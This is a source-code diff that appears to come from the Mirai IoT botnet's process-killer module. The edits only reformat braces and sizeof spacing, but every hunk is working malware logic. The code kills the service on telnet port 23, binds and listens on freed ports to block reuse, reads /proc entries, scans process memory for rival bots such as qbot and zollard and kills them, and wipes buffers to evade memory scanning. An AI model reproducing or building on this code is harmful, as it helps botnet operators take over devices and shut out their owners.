@@ -46,7 +46,9 @@ void killer_init(void)
 #ifdef DEBUG
         printf("[killer] Killed tcp/23 (telnet)\n");
 #endif
-    } else {
+    }
+    else
+    {
 #ifdef DEBUG
         printf("[killer] Failed to kill port 23\n");
 #endif
@@ -55,7 +57,7 @@ void killer_init(void)
 
     if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
     {
-        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
+        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
         listen(tmp_bind_fd, 1);
     }
 #ifdef DEBUG
@@ -75,7 +77,7 @@ void killer_init(void)
 
     if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
     {
-        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
+        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
         listen(tmp_bind_fd, 1);
     }
 #ifdef DEBUG
@@ -95,7 +97,7 @@ void killer_init(void)
 
     if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
     {
-        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
+        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
         listen(tmp_bind_fd, 1);
     }
 #ifdef DEBUG
@@ -185,7 +187,7 @@ void killer_init(void)
             table_lock_val(TABLE_KILLER_EXE);
 
             // Resolve exe_path (/proc/$pid/exe) -> realpath
-            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
+            if ((rp_len = readlink(exe_path, realpath, sizeof(realpath) - 1)) != -1)
             {
                 realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string
 
@@ -218,7 +220,7 @@ void killer_init(void)
                 printf("[killer] Memory scan match for binary %s\n", exe_path);
 #endif
                 kill(pid, 9);
-            } 
+            }
 
             /*
             if (upx_scan_match(exe_path, status_path))
@@ -231,8 +233,8 @@ void killer_init(void)
             */
 
             // Don't let others memory scan!!!
-            util_zero(exe_path, sizeof (exe_path));
-            util_zero(status_path, sizeof (status_path));
+            util_zero(exe_path, sizeof(exe_path));
+            util_zero(status_path, sizeof(status_path));
 
             sleep(1);
         }
@@ -291,7 +293,8 @@ BOOL killer_kill_by_port(port_t port)
         while (buffer[i] != 0 && buffer[i] != ':')
             i++;
 
-        if (buffer[i] == 0) continue;
+        if (buffer[i] == 0)
+            continue;
         i += 2;
         ii = i;
 
@@ -514,7 +517,7 @@ static BOOL memory_scan_match(char *path)
     m_upx_str = table_retrieve_val(TABLE_MEM_UPX, &m_upx_len);
     m_zollard = table_retrieve_val(TABLE_MEM_ZOLLARD, &m_zollard_len);
 
-    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
+    while ((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
     {
         if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||
             mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||
